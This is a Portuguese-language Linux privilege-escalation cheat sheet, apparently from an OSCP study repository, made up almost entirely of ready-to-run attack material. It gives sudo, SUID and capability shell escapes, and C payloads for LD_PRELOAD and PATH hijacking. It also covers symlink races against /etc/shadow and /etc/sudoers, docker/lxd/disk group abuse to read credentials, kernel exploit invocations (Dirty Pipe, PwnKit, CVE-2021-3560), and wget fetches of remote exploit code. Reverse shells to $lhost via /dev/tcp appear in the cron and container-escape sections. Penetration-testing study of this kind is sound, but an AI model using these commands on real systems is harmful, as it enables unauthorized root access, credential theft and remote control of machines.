# Escalação de Privilégios Linux

## Índice

- [Enumeração](#enumeração)
- [Exploração de SUDO](#exploração-de-sudo) ➜ [Guia GTFOBins](GTFOBins-Linux.md)
- [Exploração de SUID/SGID](#exploração-de-suidsgid)
- [Sequestro de PATH via SUID](#sequestro-de-path-via-suid)
- [Capabilities](#capabilities)
- [Cron Jobs](#cron-jobs)
- [Race Condition (TOCTOU)](#race-condition-toctou)
- [Abuso de Membros de Grupo](#abuso-de-membros-de-grupo)
- [Exploits SUID Adicionais](#exploits-suid-adicionais)
- [Exploits de Kernel](#exploits-de-kernel)
- [Ferramentas de Enumeração](#ferramentas-de-enumeração)
- [NFS Root Squashing](#nfs-root-squashing)
- [Escape de Docker](#escape-de-docker)
- [Veja Também](#veja-também)

---

## Enumeração

### Verificação Rápida (One-liner)

```shell
id && sudo -l 2>/dev/null && find / -perm -4000 -type f 2>/dev/null && getcap -r / 2>/dev/null && cat /etc/crontab
```

### Enumeração Completa (One-liner)

```shell
# Enumerar sistema completo
uname -a && id && sudo -l 2>/dev/null && cat /etc/crontab 2>/dev/null

# Encontrar todos os binários SUID
find / -perm -4000 -type f 2>/dev/null | xargs ls -la

# Encontrar arquivos /etc graváveis
find /etc -writable -type f 2>/dev/null

# Buscar senhas
grep -rniE 'password|passwd|pwd|secret|credential' /etc /home /var/www 2>/dev/null | head -50
```

### Verificação SUID (One-liner)

```shell
# Encontrar SUID e verificar no GTFOBins
for bin in $(find / -perm -4000 -type f 2>/dev/null); do echo "[*] $bin"; done
```

### Verificação de Capabilities (One-liner)

```shell
# Encontrar arquivos com capabilities
getcap -r / 2>/dev/null
```

### Verificação de Cron Jobs (One-liner)

```shell
# Verificar todos os locais de cron
cat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/* 2>/dev/null; ls -la /etc/cron.*/ 2>/dev/null
```

---

## Exploração de SUDO

**📖 Veja o guia completo GTFOBins: [GTFOBins-Linux.md](GTFOBins-Linux.md)**

```shell
sudo -l    # Listar permissões sudo
```

### Escapes Rápidos (Mais Comuns)

| Binário | Comando |
| --- | --- |
| vim | `sudo vim -c ':!/bin/bash'` |
| find | `sudo find / -exec /bin/bash \; -quit` |
| python | `sudo python3 -c 'import os; os.system("/bin/bash")'` |
| less | `sudo less /etc/passwd` → `!/bin/bash` |
| awk | `sudo awk 'BEGIN {system("/bin/bash")}'` |

### Exploração de LD_PRELOAD

> Se `env_keep+=LD_PRELOAD` aparecer no `sudo -l`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```shell
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <BINARIO_PERMITIDO>
```

---

## Exploração de SUID/SGID

```shell
find / -perm -4000 -type f 2>/dev/null
```

> Verificar GTFOBins para exploits SUID: <https://gtfobins.github.io/>

### Exploits SUID Comuns

```shell
# /usr/bin/find com SUID
./find . -exec /bin/sh -p \; -quit

# /usr/bin/python3 com SUID
./python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# /usr/bin/vim com SUID
./vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# /usr/bin/bash com SUID
./bash -p
```

---

## Sequestro de PATH via SUID

> Quando um binário SUID chama outro binário sem o caminho completo

### Identificar SUID Vulnerável

```shell
# Encontrar binários SUID
find / -perm -4000 -type f 2>/dev/null

# Verificar quais comandos o binário chama
strings /caminho/para/suid_binario
ltrace /caminho/para/suid_binario 2>&1
strace /caminho/para/suid_binario 2>&1

# Procurar chamadas como: system("comando") em vez de system("/usr/bin/comando")
```

#### Exploração

```c
// exploit.c - Criar binário malicioso para sequestro de PATH
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
```

```shell
# Compilar binário malicioso
gcc -o <nome_do_binario_sequestrado> exploit.c
chmod +x <nome_do_binario_sequestrado>

# Adicionar diretório atual ao início do PATH
export PATH=$(pwd):$PATH

# Executar o binário SUID vulnerável
/caminho/para/suid_binario
# Obter shell root!
```

#### Exemplo: Sequestro de SUID scp

```shell
# Se /usr/bin/scp tem SUID e chama 'ssh' sem caminho completo:
gcc -o ssh exploit.c
chmod +x ssh
export PATH=$(pwd):$PATH
scp arquivo user@host:/caminho
# Obter shell root porque scp chama nosso 'ssh' malicioso
```

---

## Capabilities

```shell
getcap -r / 2>/dev/null
```

### Exemplos de Exploração

```shell
# cap_setuid+ep em python3
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_setuid+ep em perl
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### Tabela de Referência de Capabilities

| Capability | Binário | Exploração |
|------------|--------|--------------|
| `cap_setuid+ep` | python | `python -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| `cap_setuid+ep` | perl | `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'` |
| `cap_setuid+ep` | ruby | `ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'` |
| `cap_setuid+ep` | php | `php -r 'posix_setuid(0); system("/bin/sh");'` |
| `cap_setuid+ep` | node | `node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'` |
| `cap_dac_read_search+ep` | tar | `tar cvf /tmp/shadow.tar /etc/shadow && tar xvf /tmp/shadow.tar` |
| `cap_dac_override+ep` | vim | Ler/escrever qualquer arquivo ignorando permissões |
| `cap_net_raw+ep` | tcpdump | Captura de pacotes sem root |
| `cap_net_bind_service+ep` | — | Bind em portas < 1024 |

### Binários Comuns Exploráveis com cap_setuid

```shell
# Exploração estilo GTFOBins
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
/usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!bash' -ex quit

# cap_dac_read_search - ler arquivos protegidos
/usr/bin/tar -cvf /tmp/passwd.tar /etc/shadow
tar -xvf /tmp/passwd.tar

# Openssl para ler arquivos protegidos
openssl enc -in /etc/shadow
```

### Configurar Capabilities (como root para persistência)

```shell
# Adicionar capability
sudo setcap cap_setuid+ep /usr/bin/python3

# Remover capability
sudo setcap -r /usr/bin/python3

# Listar todos os arquivos com capabilities
getcap -r / 2>/dev/null
```

---

## Cron Jobs

```shell
cat /etc/crontab
cat /etc/cron.d/*
ls -la /etc/cron.*
crontab -l
```

### Script de Cron Gravável

```shell
# Se um cron job executa um script gravável
echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1" >> /caminho/para/script.sh
```

#### Manipulação de PATH

> Se o cron executa script sem caminho absoluto

```shell
echo "#!/bin/bash" > /tmp/nomedoscript
echo "/bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1" >> /tmp/nomedoscript
chmod +x /tmp/nomedoscript
export PATH=/tmp:$PATH
```

---

## Race Condition (TOCTOU)

> Vulnerabilidade Time-of-Check to Time-of-Use em binários SUID

### Identificar Binário Vulnerável

```shell
# Procurar padrões:
# 1. Binário verifica permissões do arquivo
# 2. Delay de tempo (sleep, chamada de rede, etc.)
# 3. Binário lê/escreve o arquivo

# Usar ltrace para ver syscalls
ltrace ./binario_suid_vulneravel arquivoteste 2>&1
# Procurar: access() seguido de open() com delay entre eles
```

#### Exploit Básico de Race Condition

```shell
# Se o binário verifica access() e depois lê o arquivo:
# Podemos trocar o arquivo entre a verificação e a leitura

# Loop para trocar symlink
while true; do
    ln -sf /root/flag.txt arquivoteste
    ln -sf /tmp/dummy.txt arquivoteste
done &

# Executar o binário SUID muitas vezes
for i in $(seq 1 1000); do
    ./binario_suid_vulneravel arquivoteste 2>/dev/null
done
```

#### TOCTOU para Leitura de Arquivos Root

```c
// switch.c - Trocar alvo do symlink rapidamente
#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    while(1) {
        unlink(argv[1]);
        symlink("/etc/shadow", argv[1]);
        unlink(argv[1]);
        symlink("/tmp/dummy", argv[1]);
    }
    return 0;
}
```

```shell
# Compilar
gcc -o switch switch.c

# Criar arquivo dummy que passa na verificação de acesso
touch /tmp/dummy && chmod 644 /tmp/dummy

# Executar trocador de symlink em background
./switch arquivoteste &

# Executar binário vulnerável repetidamente
for i in $(seq 1 1000); do ./binario_suid_vulneravel arquivoteste; done 2>/dev/null | grep -v "denied"
```

#### TOCTOU para Modificação de Sudoers

```shell
# Se o binário SUID escreve em arquivo que controlamos:
# Corrida para trocar o arquivo por /etc/sudoers

echo "usuario ALL=(ALL:ALL) NOPASSWD: ALL" > /tmp/payload

# Script trocador
while true; do
    ln -sf /tmp/payload arquivoteste
    ln -sf /etc/sudoers arquivoteste
done &

# Disparar a escrita
./binario_suid_gravador arquivoteste

# Verificar se funcionou
sudo -l
```

---

## Abuso de Membros de Grupo

### Grupo Disk

> Se o usuário está no grupo disk, pode ler o disco bruto e acessar todos os arquivos

```shell
# Verificar membros do grupo
id
groups
```

#### Usando debugfs

```shell
# Encontrar dispositivo de disco (geralmente /dev/sda1 ou /dev/sda2)
lsblk
df -h

# Ler /etc/shadow diretamente do disco
debugfs /dev/sda2
debugfs: cat /etc/shadow

# Ler chaves SSH
debugfs: cat /root/.ssh/id_rsa

# Sair do debugfs
debugfs: quit
```

#### Quebrar Senha do Root

```shell
# Copiar hash do shadow para arquivo
echo 'root:$6$...:...' > hash_root.txt

# Quebrar com john
john --wordlist=/usr/share/wordlists/rockyou.txt hash_root.txt

# Trocar para root
su root
```

### Grupo Docker

```shell
# Montar sistema de arquivos do host em container privilegiado
docker run -v /:/mnt --rm -it alpine chroot /mnt bash

# Ou abrir shell com acesso root
docker run -v /:/mnt -it alpine /bin/sh
cat /mnt/etc/shadow
```

### Grupo LXD/LXC

```shell
# Importar imagem Alpine
lxc image import ./alpine-v3.13-x86_64.tar.gz --alias myimage

# Criar container privilegiado
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

# Acessar sistema de arquivos do host
cat /mnt/root/etc/shadow
```

---

## Exploits SUID Adicionais

> Verificar GTFOBins: <https://gtfobins.github.io/>

### strace com SUID

```shell
# Se /usr/bin/strace tem bit SUID
strace -o /dev/null /bin/sh -p

# -p preserva privilégios
whoami  # Deve ser root
```

### mawk com SUID / sudo

```shell
# Se sudo mawk for permitido
sudo mawk 'BEGIN {system("/bin/sh")}'
sudo /usr/bin/mawk 'BEGIN {system("/bin/bash")}'
```

### exiftool (CVE-2021-22204)

> Vulnerabilidade no parsing de arquivo djvu — versões limitadas

```shell
# Verificar versão
exiftool -ver

# Afetado: 7.44 - 12.23
searchsploit exiftool
```

---

## Exploits de Kernel

### Dirty COW (CVE-2016-5195)

> Linux Kernel < 4.8.3

```shell
gcc -pthread dirty.c -o dirty -lcrypt
./dirty <nova_senha>
su firefart
```

### Dirty Pipe (CVE-2022-0847)

> Linux Kernel >= 5.8

```shell
gcc exploit.c -o exploit
./exploit /etc/passwd 1 "${openssl passwd -1 password}"
```

### PwnKit (CVE-2021-4034)

> LPE via polkit pkexec

```shell
python3 cve-2021-4034.py
```

### Polkit (CVE-2021-3560)

> Escalação de privilégios polkit via ataque de timing (Ubuntu 20.04, RHEL 8, Fedora 21+)

```shell
# Verificar versão do polkit
pkaction --version

# Exploit - criar usuário com privilégios sudo
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:atacante string:"Atacante" int32:1 & sleep 0.005s; kill $!

# Definir senha
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$salt$hash' string:'' & sleep 0.005s; kill $!

# Logar como novo usuário
su - atacante
sudo -i
```

> Exploit automatizado

```shell
# Baixar e executar
wget https://raw.githubusercontent.com/Almorabea/Polkit-exploit/main/CVE-2021-3560.py
python3 CVE-2021-3560.py
```

### Looney Tunables (CVE-2023-4911)

> LPE via glibc

```shell
./exp
```

### BPF Privilege Escalation (CVE-2017-16995)

> Linux Kernel 4.4.x - 4.13.x (Ubuntu 16.04)

```shell
# Verificar versão do kernel
uname -r
cat /etc/os-release

# Baixar exploit
wget https://raw.githubusercontent.com/rlarabee/exploits/master/cve-2017-16995/cve-2017-16995.c

# Compilar no alvo (ou cross-compilar)
gcc cve-2017-16995.c -o cve-2017-16995

# Executar
./cve-2017-16995
whoami  # Deve ser root
```

#### Alternativa: Searchsploit

```shell
# Encontrar exploit
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"
searchsploit -m 45010  # Copiar exploit

# Compilar e executar
gcc 45010.c -o exploit
./exploit
```

---

## Ferramentas de Enumeração

### LinPEAS

> <https://github.com/carlospolop/PEASS-ng>

```shell
./linpeas.sh
./linpeas.sh -a    # Todas as verificações
```

### LinEnum

> <https://github.com/rebootuser/LinEnum>

```shell
./LinEnum.sh
./LinEnum.sh -t    # Verificações detalhadas
```

### linux-exploit-suggester

> <https://github.com/The-Z-Labs/linux-exploit-suggester>

```shell
./linux-exploit-suggester.sh
```

### pspy

> <https://github.com/DominicBreuker/pspy>

> Monitorar processos sem root

```shell
./pspy64
./pspy64 -pf -i 1000    # Exibir comandos e eventos do sistema de arquivos
```

---

## NFS Root Squashing

```shell
# Verificar exportações NFS
cat /etc/exports
showmount -e $rhost
```

### Explorar no_root_squash

```shell
# Na máquina atacante
mkdir /tmp/nfs
mount -t nfs $rhost:/share /tmp/nfs
cp /bin/bash /tmp/nfs/
chmod +s /tmp/nfs/bash

# Na vítima
/share/bash -p
```

---

## Escape de Docker

```shell
# Verificar se está em container
cat /proc/1/cgroup
ls /.dockerenv
```

### Escape de Container Privilegiado

```shell
mkdir /tmp/escape
mount -t cgroup -o rdma cgroup /tmp/escape
mkdir /tmp/escape/x
echo 1 > /tmp/escape/x/notify_on_release
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/mounts | head -n1)
echo "$host_path/cmd" > /tmp/escape/release_agent
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/escape/x/cgroup.procs"
```

---

## Veja Também

### Arquivos Relacionados

- **[Escalação de Privilégios Windows](Privilege-Escalation-Windows.md)** — Potato exploits, DLL hijacking, armazenamento de credenciais
- **[Exploits CVE](../2.CVE-Exploit/2.1.CVE-Exploit.md)** — Dirty Cow, Dirty Pipe, exploits de kernel

### Pós-Exploração

- **[Movimentação Lateral](../5.Lateral-Movement/5.1.Lateral-Movement.md)** — Movimentação lateral via SSH
- **[Guia Ligolo-ng](../5.Lateral-Movement/5.3.Ligolo-ng-Complete-Guide.md)** — Tunnel via pivot Linux
- **[Reverse Shells](../6.OS-Command/6.3.Reverse-Shell.md)** — Payloads de shell após escalação

### Preparação OSCP

- **[Exemplos de Lab Walkthrough](../9.OSCP-Exam/9.2.Lab-Walkthrough-Examples.md)** — Privesc Linux em ação
- **[Dicas e Truques do Exame](../9.OSCP-Exam/9.3.Exam-Tips-and-Tricks.md)** — Prioridade de enumeração Linux
- **[Guia do Exame OSCP - Linux PrivEsc](../9.OSCP-Exam/9.1.OSCP-Exam-Guide.md)** — Referência rápida
